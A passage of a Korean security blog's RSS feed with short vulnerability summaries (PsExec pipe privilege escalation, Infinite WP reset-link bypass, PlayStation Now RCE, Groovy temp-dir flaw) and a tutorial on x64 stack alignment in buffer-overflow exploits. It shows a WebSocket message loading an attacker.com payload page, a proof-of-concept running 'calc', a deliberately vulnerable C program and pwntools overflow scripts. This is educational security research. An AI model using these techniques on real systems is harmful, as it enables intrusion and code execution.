PSEXESVC가 낮은 권한으로 생성된 <code>\\PSEXESVC</code> 파이프의 handle을 가져오면 PSEXESVC을 통해 SYSTEM 권한으로 명령, 응용 프로그램 실행이 가능합니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/named-pipe/">named pipe</category>
      
      <category domain="https://hackyboiz.github.io/tags/psexec/">psexec</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/10/idioth/2020-12-10/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-28642: Auth bypass via password reset mechanism</title>
      <link>https://hackyboiz.github.io/2020/12/09/fabu1ous/2020-12-09/</link>
      <guid>https://hackyboiz.github.io/2020/12/09/fabu1ous/2020-12-09/</guid>
      <pubDate>Wed, 09 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://ssd-disclosure.com/ssd-advisory-auth-bypass-and-r</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-auth-bypass-and-rce-in-infinite-wp-admin-panel/">Auth bypass and RCE in Infinite WP admin panel</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Infinite WP &lt;= 2.15.6</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>WordPress 웹사이트의 관리 솔루션 Infinite WP에서 비밀번호 재설정 방식의 결함을 이용해 admin panel에 접근할 수 있는 인증 우회 취약점이 발견되었습니다.</p><pre><code class="hljs php">$hashValue = serialize(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;hashCode&#x27;</span> =&gt; <span class="hljs-string">&#x27;resetPassword&#x27;</span>, <span class="hljs-string">&#x27;uniqueTime&#x27;</span> =&gt; microtime(<span class="hljs-literal">true</span>), <span class="hljs-string">&#x27;userPin&#x27;</span> =&gt; $userDets[<span class="hljs-string">&#x27;userID&#x27;</span>]));$resetHash = sha1($hashValue);[...]$verificationURL = APP_URL.<span class="hljs-string">&quot;login.php?view=resetPasswordChange&amp;resetHash=&quot;</span>.$resetHash.<span class="hljs-string">&quot;&amp;transID=&quot;</span>.sha1($params[<span class="hljs-string">&quot;email&quot;</span>]);</code></pre><p>비밀번호 재설정 링크를 생성하는 php코드입니다.  피해자의 <code>email</code>을 사전에 입수하고 <code>userID</code>,  <code>microtime(true)</code> 값을 유추할 수 있다면 누구나 유효한 링크를 타고 원하는 유저의 비밀번호를 재설정할 수 있습니다.</p><ul><li>userID<ul><li>auto-increment integer입니다. manage-user라는 유료 addon을 구매하지 않았다면 기본값이 1입니다.</li></ul></li><li>email<ul><li>가입되지 않은 email 주소라면 <code>login.php?view=resetPassword&amp;errorMsg=resetPasswordEmailNotFound</code>로 redirect 됩니다. 이를 이용해 Infinite WP에 가입된 email인지 판별할 수 있습니다.</li></ul></li><li>microtime(true)<ul><li>microtime(true)의 값은 비밀번호 재설정 링크가 만들어질 때의 Unix timestamp입니다. Http date 해더 값을 이용해 유추가 가능합니다.</li></ul></li></ul><p>생성된 링크는 24시간 동안 유효합니다. 공개된 POC는 위에서 설명한 세 값을 이용해 브루트포싱 공격을 시도하며 평균 1시간 내외로 유효한 링크를 찾아냅니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/authentication-bypass/">authentication bypass</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/09/fabu1ous/2020-12-09/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Remote Code Execution in PlayStation Now</title>
      <link>https://hackyboiz.github.io/2020/12/08/l0ch/2020-12-08/</link>
      <guid>https://hackyboiz.github.io/2020/12/08/l0ch/2020-12-08/</guid>
      <pubDate>Tue, 08 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://hackerone.com/reports/873614&quot;&gt;RCE in PlayStation </description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/873614">RCE in PlayStation Now</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>PlayStation Now ≤ 11.0.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>게임 스트리밍 서비스 PlayStation Now에서 원격 코드 실행 취약점이 발견되었습니다.<br><br><br>PS Now의 주요 구성요소로는 QAS와 AGL이 있습니다. QAS는 Qt5 프레임워크로 개발된  <code>psnowlauncher.exe</code> 실행파일이며 PS Now의 메인 애플리케이션입니다.  AGL은 Electron 응용 프로그램이며 QAS에 의해 실행됩니다. 처음 로드할 페이지의 URL을 매개변수로 받아 실행이 가능합니다.<br><br><br><code>nodeIntegration</code>은 <code>Electron BrowserWindows</code>에서 실행되는 기능으로 javascript에서 Windows 프로세스를 생성할 수 있습니다. 기본값은 false지만 AGL에서는 true로 설정되어 있으며, AGL은 로드하는 URL 검증을 하지 않아 해커의 페이로드가 담긴 URL을 통해 javascript에서 임의 코드를 실행할 수 있습니다.<br><br><br>이 임의 코드 실행 취약점은 QAS에서 실행되는 로컬 웹 소켓 서버를 통해 원격으로 수행할 수 있습니다. 웹사이트가 다음 request를 로컬 웹 소켓 서버에 보내면 AGL에 로드된 URL을 QAS에서 실행합니다.  </p><pre><code class="hljs json">&#123;  <span class="hljs-attr">&quot;command&quot;</span>: <span class="hljs-string">&quot;setUrl&quot;</span>,  <span class="hljs-attr">&quot;params&quot;</span>: &#123;    <span class="hljs-attr">&quot;url&quot;</span>: <span class="hljs-string">&quot;https://normal_url.com&quot;</span>  &#125;,  <span class="hljs-attr">&quot;source&quot;</span>: <span class="hljs-string">&quot;AGL&quot;</span>,  <span class="hljs-attr">&quot;target&quot;</span>: <span class="hljs-string">&quot;QAS&quot;</span>&#125;</code></pre><p>그러나 source와 target을 바꿔 URL을 AGL에서 로드할 수 있도록 구성하면 원격에서 AGL이 로드할 URL을 조작할 수 있습니다.<br><br><br>피해자의 컴퓨터에서 PS Now와 QAS, 로컬 웹 소켓이 실행 중일 경우 아래와 같은 방법으로 원격 코드 실행이 가능합니다.</p><ol><li><p>브라우저로 해커의 웹사이트에 접속합니다.</p></li><li><p>웹 사이트는 피해자 PC의 웹 소켓 서버 <code>ws://localhost:1235</code> 에 연결됩니다.</p></li><li><p>웹사이트는 웹 소켓 서버에 다음과 같은 메시지를 보냅니다. </p> <pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;command&quot;</span>:<span class="hljs-string">&quot;setUrl&quot;</span>,<span class="hljs-attr">&quot;params&quot;</span>:&#123;<span class="hljs-attr">&quot;url&quot;</span>:<span class="hljs-string">&quot;https://attacker.com/rce_payload.html&quot;</span>&#125;,<span class="hljs-attr">&quot;source&quot;</span>:<span class="hljs-string">&quot;QAS&quot;</span>,<span class="hljs-attr">&quot;target&quot;</span>:<span class="hljs-string">&quot;AGL&quot;</span>&#125;</code></pre></li><li><p>AGL은 <code>https://attacker.com/rce_payload.html</code> 를 로드합니다. 이때 <code>rce_payload.html</code>의 javascript 코드가 피해자의 PC에서 실행됩니다.</p> <pre><code class="hljs jsx"><span class="hljs-comment">// rce_payload.html</span>&lt;html&gt;    &lt;head&gt;        &lt;title&gt;PS Now RCE&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;script&gt;            <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>)            .exec(<span class="hljs-string">&#x27;calc&#x27;</span>)        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre></li></ol>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/playstation/">playstation</category>
      
      <category domain="https://hackyboiz.github.io/tags/remote-code-execution/">remote code execution</category>
      
      <category domain="https://hackyboiz.github.io/tags/playstation-now/">playstation now</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/08/l0ch/2020-12-08/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-17521: Apache Groovy Information Disclosure</title>
      <link>https://hackyboiz.github.io/2020/12/07/idioth/2020-12-07/</link>
      <guid>https://hackyboiz.github.io/2020/12/07/idioth/2020-12-07/</guid>
      <pubDate>Mon, 07 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://seclists.org/oss-sec/2020/q4/183&quot;&gt;https://seclist</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2020/q4/183">https://seclists.org/oss-sec/2020/q4/183</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Unsupported Codehaus version of Groovy from 2.0 to 2.4.4.</li><li>Apache Groovy versions 2.4.4 to 2.4.20 2.5.0 to 2.5.13, 3.0.0 to 3.0.6, and 4.0.0-alpha-1.</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apache Groovy에서 <code>createTempDir</code> method로 인한 Local Privilege Escalation과 Information Disclosure가 가능한 취약점이 발견되었습니다. 이 취약점은 유닉스 기반 운영 체제와 Mac OSX, Windows의 옛날 버전이 영향을 받습니다. 취약점에 노출되는 조건은 아래와 같습니다.</p><ul><li>영향을 받는 운영 체제에서 Groovy code가 동작</li><li>다른 유저가 Groovy code에 접근할 수 있음</li><li><code>createTempDir</code> extension method를 통해 임시 디렉터리가 생성</li></ul><p>Groovy는 모든 유저가 공유할 수 있는 OS 임시 디렉터리 내에 임시 디렉터리를 만들 수 있습니다. Groovy에서 <code>createTempDir</code> method를 사용하면 java stub을 생성할 때 사용되거나 user code를 대신하기 위한 임시 디렉터리가 생성됩니다. Groovy user code가 <code>createTempDir</code> method를 사용하여 임시 디렉터리에 실행할 수 있는 코드를 저장하면 Local Privilege Escalation이 가능하고 민감한 정보를 저장하기 위해 임시 디렉터리가 사용된다면 정보가 노출되거나 수정될 수 있습니다.</p><p>취약점이 수정된 Groovy 2.5 이상 버전과 JDK 7 이상에서 실행되는 Groovy 2.4에서는 Groovy Code를 실행하는 사용자만 읽을 수 있는 디렉터리를 생성하는 새로운 JDK method를 사용합니다. 하지만 이 방법은 Local Privilege Escalation은 막을 수 있지만 Information Disclosure는 막을 수 없습니다.</p><p>시스템 환경 변수 <code>java.io.tmpdir</code>를 실행 중인 사용자의 고유 디렉터리로 설정하면 모든 운영 체제와 Groovy 버전에서 취약점이 해결됩니다. 혹은 Groovy extension method 대신 JDK의 <code>Files#createTempDirectory</code> method를 사용하여 취약점을 방지할 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/information-disclosure/">information disclosure</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/apache/">apache</category>
      
      <category domain="https://hackyboiz.github.io/tags/groovy/">groovy</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/07/idioth/2020-12-07/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] x64 stack alignment</title>
      <link>https://hackyboiz.github.io/2020/12/06/fabu1ous/x64-stack-alignment/</link>
      <guid>https://hackyboiz.github.io/2020/12/06/fabu1ous/x64-stack-alignment/</guid>
      <pubDate>Sun, 06 Dec 2020 04:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;머릿말&quot;&gt;&lt;a href=&quot;#머릿말&quot; class=&quot;headerlink&quot; title=&quot;머릿말&quot;&gt;&lt;/a&gt;머릿말&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/2020/12/06/fabu1ous/x64-stack-alignment/1.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="머릿말"><a href="#머릿말" class="headerlink" title="머릿말"></a>머릿말</h1><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/1.png"></p><p>비밀 프로젝트( 아직 비밀, 쉿! ) 때문에 Ubuntu 20.04에서 몇 가지 테스트를 하다가 처음 보는 에러에 당황했습니다. <code>do_system+364: movaps</code> 인스트럭션에서 Segmentation Fault가 발생하더라고요.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/2.png"></p><p>알아보니까 Ubuntu 18.04부터 <code>do_system()</code>에 <code>movaps</code>인스트럭션이 하나 추가됐습니다. 조금 뒤에 자세히 설명하겠지만, x64 리눅스에선 16바이트로 stack alignment를 지켜야 합니다. stack alignment가 깨져있으면 이 인스트럭션을 실행하다 Segmentation Fault가 뜹니다.</p><p>이놈 때문에 18.04 이전 버전에서 익스 되는 BOF 공격코드가 18.04 이후 버전에서는 사용할 수 없는 경우도 있다고 합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/3.png"></p><p><em>故 Fabu1ous의 네이버 블로그 (2018.10 ~ 2019.12)</em></p><p>지금까지 푼 포너블 문제만 백몇 개쯤 되고 수없이 많은 <code>system(&quot;/bin/sh&quot;)</code>을 호출해 봤는데 어째서 이 사실을 이제야 알게 된 거지?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/4.png"></p><p>작년(2019) 크리스마스 CTF에서 단순 ROP문제를 익스 못해서 화났던 기억이 머리를 스치고 지나갔습니다. 분명 로컬에선 익스가 되던 게 리모트 익스가 안돼서 팀원에게 코드를 넘겨주고 다른 문제 보러 갔었죠. 그때 못 풀었던 ROP문제는 solo_test란 문제였는데 그때 로컬 환경이 우분투 16.04였습니다… 후…</p><p>대회 끝나고 바로 며칠 뒤에 이 주제에 대한 라업이 하나 올라왔는데 1년이 지난 지금에서야 찾아본 제 자신이 너무 밉네요. ROP문제라고 대수롭지 않게 그냥 넘겨버린 것에 반성하며 지금이라도 공부해봅시다.</p><blockquote><p>늦었다고 생각할 때가 진짜 너무 늦었다 -박명수-</p></blockquote><h1 id="x64-Stack-Alignment"><a href="#x64-Stack-Alignment" class="headerlink" title="x64 Stack Alignment"></a>x64 Stack Alignment</h1><p>stack alignment는 stack의 top이 16의 배수로 유지된 상태며 메모리의 access cycle을 최소한으로 줄이기 위해 사용합니다. ( CS를 공부하다가 “왜?”라는 질문을 던지면 십중팔구 “효율”이라는 대답이 돌아옴, 더 자세한 건 직접 찾아보시길 ) 그리고 이 stack alignment를 유지하기 위해 RSP의 위치가 정해지는 규칙이 있습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/5.png"></p><p>Linux 64 <a href="https://software.intel.com/sites/default/files/article/402129/mpx-linux64-abi.pdf">ABI</a>( Application binary interface )에 따르면 프로그램의 흐름( control )이 함수의 entry로 옮겨지는 시점에선 스택 포인터(rsp)+8이 항상 16의 배수여야 합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/6.png"></p><p>방금 전엔 RSP를 16의 배수로 유지하는 게 stack alignment라 해놓고 갑자기 RSP+8이 16의 배수라니, 뭐라는 거야?</p><p>무슨 소린지 모르겠죠? 설명이 뭐 같이 쓰여있어서 그렇지 사실 아주 간단합니다.</p><pre><code class="hljs c"><span class="hljs-comment">// test.c</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hello</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello stack alignment\\n&quot;</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;hello();<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><pre><code class="hljs bash">$ gcc -o <span class="hljs-built_in">test</span> test.c -no-pie$ gdb -q <span class="hljs-built_in">test</span></code></pre><p>간단한 예제를 통해 확인해봅시다. 디버깅할 때 거슬리니 PIE는 해제하고 컴파일하세요. 저는 Ubuntu 20.04와 glibc-2.31를 사용했습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/7.png"></p><pre><code class="hljs bash">pwndbg&gt; bp main</code></pre><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/8.png"></p><pre><code class="hljs bash">pwndbg&gt; r</code></pre><p>정상적으로 호출된 <code>main()</code> 함수의 entry point입니다. 아직 프롤로그를 실행하기 전이니 RSP+8은 16의 배수겠죠?</p><p>RSP : <code>0x7fffffffe038</code></p><p>RSP+8 : <code>0x7fffffffe040</code></p><p>위 스크린샷을 보면 RSP+8은 <code>0x7fffffffe040</code>이므로 16의 배수가 맞습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/9.png"></p><p>그럼 다들 알다시피 call 인스트럭션으로 함수를 호출하면 stack에 return address를 push 하니까 call 인스트럭션을 실행하기 직전엔 RSP가 16의 배수겠죠?</p><p>RSP : <code>0x7fffffffe030</code></p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/10.png"></p><p>그리고 함수 프롤로그에서 <code>push rbp</code>를 하니까 rbp는 항상 16의 배수겠네요?</p><p>RSP : <code>0x7ffffffffdfe0</code></p><p>대충 정리해보면 stack align을 지키면서 함수를 호출하는 흐름은 다음과 같습니다.</p><ol><li>call 실행 직전 RSP는 16의 배수 ( stack align O )</li><li>함수의 entry point에선 RSP+8이 16의 배수 ( stack align X )</li><li>함수의 프롤로그 실행 후 RSP는 16의 배수 ( stack align O )</li><li>RBP는 항상 16의 배수 ( stack align O )</li></ol><p>사실, 함수를 호출할 때 2번 과정에서 잠시 stack align이 깨지고 3번에서 다시 stack align이 맞춰집니다. 여기서 2번만 똑 떼서 “이 것만 지키시면 stack align입니다.”라고 설명을 써놔서 헷갈리는 겁니다. 이래도 이해 안 되시면 4번만 기억하세요. 4번만 신경 써줘도 공격 코드를 짜는데 아무 지장이 없을 겁니다. 더 자세한 설명은 조금 이따 하겠습니다.</p><h1 id="MOVAPS"><a href="#MOVAPS" class="headerlink" title="MOVAPS"></a>MOVAPS</h1><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/11.png"></p><p>이 규칙을 꼭 지켜야 하는가? 물론 아닙니다. 방금 전에도 설명했듯이 유연하게 어겼다가 지켰다가 할 수 있습니다. 그리고 stack alignment는 효율을 높이기 위해 유지한다고도 설명했다시피 지키지 않아도 프로그램이 동작하는데 아무 문제없습니다. 다만 효율이 좀 떨어질 뿐… 물론 예외가 존재하는데 몇몇 intel/AMD cpu에서 SSE instruction을 실행할 때  stack alignment가 깨져있으면 segmentation fault가 발생합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/12.png"></p><p>그리고 <a href="http://qcd.phys.cmu.edu/QCDcluster/intel/vtune/reference/vc181.htm">MOVAPS</a>가 바로 SSE intruction 중 하나입니다. XMM 레지스터끼리 혹은 XMM 레지스터와 메모리 사이에서 double quadword( 16byte ) 크기의 데이터를 옮기는 인스트럭션인데, 메모리의 align 여부를 강제합니다.</p><pre><code class="hljs c">&lt;do_system+<span class="hljs-number">364</span>&gt; movaps xmmword ptr [rsp + <span class="hljs-number">0x50</span>], xmm0</code></pre><p>XMM 레지스터와 메모리 사이에서 데이터를 옮길 때, 메모리의 align이 깨져있으면 general protection( #GP / SIGSEGV ) fault를 발생시킵니다. 그리고 Ubuntu 18.04부터 이 movaps 인스트럭션이 <code>do_system()</code>을 포함한 여러 멀티미디어 오퍼레이션에 추가되어 exploit을 작성할 때 stack alignment를 신경 써야 합니다.</p><h1 id="JMP-vs-CALL-vs-RET"><a href="#JMP-vs-CALL-vs-RET" class="headerlink" title="JMP vs CALL vs RET"></a>JMP vs CALL vs RET</h1><p>그래서 Exploit이랑 stack align이 깨지는 거랑 무슨 상관인데? 그래서 왜 16.04에선 쉘을 띄우던 공격 코드가 18.04부턴 작동 안 하는 건데? 이거를 이해하려면 우선 control intsruction들의 차이를 알아야 합니다. 생각보다 모르는 사람이 많더라고… 각 인스트럭션마다 스택의 변화, 더 자세히 말하자면 RSP의 변화가 어떤지 알아야 합니다.</p><h2 id="1-JMP"><a href="#1-JMP" class="headerlink" title="1. JMP"></a>1. JMP</h2><blockquote><p>Transfers program control to a different point in the instruction stream <strong>without</strong> recording <strong>return information</strong>.</p></blockquote><p>단순히 프로그램의 흐름을 옮김. 인용구를 보면 알겠지만 리턴 정보를 저장하지 않습니다. jmp 인스트럭션으로 인한 스택의 변화는 없다고 생각하시면 됩니다.</p><h2 id="2-CALL"><a href="#2-CALL" class="headerlink" title="2. CALL"></a>2. CALL</h2><p>반면 call 인스트럭션은 프로그램의 흐름을 옮기는 것이 아니라 subroutine에 잠시 들렀다가 돌아오는 것이기 때문에 리턴 정보를 저장합니다. 그리고 그 리턴 정보는 stack에 push 하기 때문에 call 인스트럭션을 실행한 뒤엔 RSP의 값이 8만큼 감소합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/13.png"></p><p>RSP : <code>0x7fffffffe030</code></p><p>call hello 인스트럭션이 실행되면 &lt;main+18&gt;을 stack에 push 하겠죠?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/14.png"></p><p>RSP : <code>0x7fffffffe028</code></p><p>따라서 정상적으로 호출된 함수의 entry point에선 RSP+8이 16의 배수가 되는 겁니다. 여기서 꼭 기억하셔야 할 것이 Call을 실행한 직후엔 일시적으로 stack align이 깨진다는 겁니다.</p><h2 id="3-RET"><a href="#3-RET" class="headerlink" title="3. RET"></a>3. RET</h2><pre><code class="hljs c">pop ripjmp rip</code></pre><p>call을 설명할 때 sub routine에 잠시 들렀다 돌아간다고 했습니다. 물론 이 모든 동작을 call이 다 하진 않고, 원래의 인스트럭션 스트림으로 다시 돌아가는 동작은  ret이 대신해줍니다.</p><p>ret은 두 인스트럭션을 하나로 합쳐 놨다고 생각하시면 되는데, call이 저장해놓은 리턴 정보를 스택에서 빼내어 jmp 합니다. 즉, RSP값이 8만큼 증가한다는 뜻입니다.</p><p>!<img src="/2020/12/06/fabu1ous/x64-stack-alignment/15.png"></p><p>RSP : <code>0x7fffffffe028</code></p><p>위 스크린샷은 ret을 실행하기 직전의 상황입니다. RSP 값을 보면 아시겠지만 ret을 실행하기 직전엔 stack align이 깨져있습니다. 이는 함수 에필로그의 leave 명령어 혹은 pop rbp의 결과겠죠?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/16.png"></p><p>RSP : <code>0x7fffffffe030</code></p><p>그리고 ret을 실행하면 RSP가 8만큼 증가하고 stack align이 다시 맞춰집니다.</p><h2 id="정리"><a href="#정리" class="headerlink" title="정리"></a>정리</h2><ul><li>call : RSP-=8 → 일시적으로 stack align을 깸</li><li>ret : RSP+=8 → leave 명령어로 깨진 stack align을 다시 맞춤</li></ul><h1 id="Abnormal-call"><a href="#Abnormal-call" class="headerlink" title="Abnormal call"></a>Abnormal call</h1><p>자 이쯤 되면 대충 눈치채셨을 거 같은데, BOF공격을 할 때 ret으로 함수를 호출하죠? shellcode를 실행하는 건 논외로 치고, ret2libc( RTL )나 ROP로 BOF exploit을 하게 될 텐데 call이 아니라 ret으로 함수를 호출하기 때문에 stack alignment가 깨지게 되는 겁니다.</p><h2 id="vuln-c"><a href="#vuln-c" class="headerlink" title="vuln.c"></a>vuln.c</h2><pre><code class="hljs c"><span class="hljs-comment">// vuln.c</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">win</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">char</span> buf[<span class="hljs-number">16</span>];read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">128</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;$ gcc -o vuln vuln.c -no-pie -fno-<span class="hljs-built_in">stack</span>-protector</code></pre><p>정말 간단한 BOF 예제로 확인해보죠. vuln.c를 작성하고 컴파일해줍시다. BOF를 할 거니까 당연히 stack canary는 해제해주세요.</p><h2 id="bof-py"><a href="#bof-py" class="headerlink" title="bof.py"></a>bof.py</h2><pre><code class="hljs python"><span class="hljs-comment"># bof.py</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = process(<span class="hljs-string">&#x27;./vuln&#x27;</span>)gdb.attach(p)win = <span class="hljs-number">0x401156</span>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">24</span> + p64(win)p.sendline(payload)p.interactive()$ python3 bof.py</code></pre><p><code>main()</code>의 return 주소를 <code>win()</code> 함수의 entry point로 덮어쓰는 공격 코드입니다.</p><h2 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h2><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/17.png"></p><pre><code class="hljs bash">pwndbg&gt; bp main+45pwndbg&gt; c</code></pre><p><code>main()</code>의 ret에 break point를 걸고 <code>win()</code> 함수가 호출된 후의 stack 상황을 봅시다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/18.png"></p><pre><code class="hljs bash">pwndbg&gt; ni</code></pre><p>ret으로 함수 <code>win()</code>의 entry point에 도달하면</p><p>프롤로그를 실행하고 나면 stack alignment가 깨지게 됩니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/19.png"></p><p>컴퓨터는 stack이 항상 align 돼있다고 가정하고 그 상태를 유지하려고 합니다. 즉, <code>win()</code>에서 깨져버린 alignment를 깨진 상태로 유지하게 되고, <code>win()</code> 이후에 호출되는 함수들의 stack alignment는 깨진 상태가 됩니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/20.png"></p><p>그리고 결국 <code>do_system()</code>을 실행하다 movaps에 걸려 segmentation fault를 띄우고 exploit은 실패하게 됩니다.</p><h1 id="RET-sled"><a href="#RET-sled" class="headerlink" title="RET sled"></a>RET sled</h1><p>지금까지 설명한 내용을 이해하셨다면 앞으로 공격 코드를 짜실 때 아무 문제없을 거라 생각합니다. 그래도 여기서 글을 마무리 짓긴 애매하니 해결 방법을 알아보죠.</p><pre><code class="hljs python"><span class="hljs-comment">#bof2.py</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = process(<span class="hljs-string">&#x27;./vuln&#x27;</span>)win = <span class="hljs-number">0x401156</span>ret = <span class="hljs-number">0x40119a</span> <span class="hljs-comment"># ret sled</span>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">24</span> + p64(ret) + p64(win)p.sendline(payload)p.interactive()</code></pre><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/21.png"></p><pre><code class="hljs bash">$ python3 bof2.py</code></pre><p>네. 정말 별거 없습니다. ret 가젯을 하나 더 추가해서 RSP의 위치를 8만큼 조정해주면 BOF 공격을 할 때 stack alignment를 유지할 수 있습니다. 너무 단순하고 당연해서 더 설명할 게 없네요.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/22.png"></p><p>짠!</p><h1 id="마치며"><a href="#마치며" class="headerlink" title="마치며"></a>마치며</h1><p>RET sled 말고도 stack alignment를 유지하면서 ROP 하는 방법은 많습니다. 사실 한 가지 방법 더 보여드리려고 했는데 그건 endbr64랑 CET까지 설명해야 돼서 기회가 되면 따로 글을 작성하겠습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/23.png"></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/bof/">bof</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwnable/">pwnable</category>
      
      <category domain="https://hackyboiz.github.io/tags/stack-alignment/">stack alignment</category>
      
      <category domain="https://hackyboiz.github.io/tags/rtl/">rtl</category>
      
      <category domain="https://hackyboiz.github.io/tags/rop/">rop</category>
      
      
